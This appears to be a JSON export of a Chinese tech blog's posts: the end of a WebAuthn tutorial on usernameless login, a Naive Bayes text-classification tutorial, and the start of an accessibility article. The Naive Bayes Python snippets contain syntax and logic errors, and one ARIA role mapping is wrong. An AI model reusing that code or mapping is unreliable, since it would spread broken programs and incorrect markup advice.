\"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            #计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 